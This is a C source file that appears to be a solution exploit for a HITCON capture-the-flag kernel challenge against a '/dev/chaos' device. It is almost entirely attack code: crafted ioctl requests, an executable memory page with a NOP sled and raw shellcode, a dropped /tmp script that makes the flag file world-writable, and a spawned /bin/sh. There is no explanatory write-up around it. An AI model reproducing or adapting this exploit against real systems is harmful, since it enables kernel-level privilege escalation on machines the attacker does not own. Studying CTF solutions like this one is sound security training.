#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

#include "io.c"

struct request {
    unsigned type;
    unsigned in_off;
    unsigned in_size;
    unsigned key_off;
    unsigned key_size;
    unsigned out_off;
    unsigned out_size;
};

void *addr;

void wait() {
    while(read64(addr + 0x10000) == 0) {
        usleep(1000);
    }
    write64(addr + 0x10000, 0);
}

void notify() {
    write64(addr + 0x10008, 1);
}

int main(int argc, char** argv) {
    if (argc == 1) {
        char *cmd[] = {"/bin/sh", NULL};
        execv(cmd[0], cmd);
    }

    system("echo -ne '#!/bin/sh\\nchmod 777 /flag\\n' > /tmp/a");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/b");
    system("chmod 777 /tmp/*");

    uint64_t rwx_base_addr = 0x2c0000000;
    void* rwx_page = mmap(0x2c0000000, 0x2000000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (rwx_page != rwx_base_addr) {
        printf("mmap error\n");
        return 1;
    }
    memset(rwx_page, 0x90, 0x1000000);
    uint8_t shellcode[] = {72, 139, 68, 36, 96, 72, 45, 158, 1, 32, 0, 72, 141, 152, 32, 18, 69, 1, 72, 185, 47, 116, 109, 112, 47, 97, 0, 0, 72, 137, 11, 195, 72, 141, 152, 128, 201, 13, 0, 72, 199, 199, 0, 0, 0, 1, 255, 211, 235, 254};
    memcpy(rwx_page + 0x1000000, shellcode, sizeof(shellcode));

    struct request req = {0};

    req.in_off = 0;
    req.in_size = 0x10;
    req.out_off = 0;
    req.out_size = 0x10;

    int fd = open("/dev/chaos", O_RDWR);

    int out = ioctl(fd, 0x4008CA00u, 0xf0000);
    printf("allocate: %d\n", out);

    addr = mmap(0LL, 0xf0000, PROT_READ|PROT_WRITE, 1u, fd, 0LL);
    printf("mmap: %p\n", addr);

    memset(addr, 0x41, 0x20);

    out = ioctl(fd, 0xC01CCA00u, &req);
    printf("request: %d\n", out);

    notify();
    wait();
    printf("%p\n", read64(addr + 0x5000));

    req.in_off = 0;
    req.in_size = 0x10;
    req.out_off = 0;
    req.out_size = 0x10;
    out = ioctl(fd, 0xC01CCA00u, &req);
    printf("request2: %d\n", out);
}

// hitcon{so this is how we attack kernel from a device}